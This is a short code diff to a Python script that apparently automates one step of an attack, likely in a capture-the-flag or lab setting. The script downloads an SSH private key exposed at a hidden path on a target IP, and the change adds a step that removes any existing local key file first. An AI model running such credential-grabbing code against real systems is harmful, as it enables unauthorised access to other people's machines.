@@ -23,6 +23,11 @@ print(f"[+] Target IP: {target_ip}")
 key_url = f"http://{target_ip}/Cpxtpt2hWCee9VFa.txt"
 key_file = "id_rsa"
 
+# Remove existing key file if it exists
+if os.path.exists(key_file):
+    print(f"[!] Found existing {key_file}, removing it to avoid conflict...")
+    os.remove(key_file)
+
 print(f"[+] Downloading SSH private key from: {key_url}")
 try:
     response = requests.get(key_url)
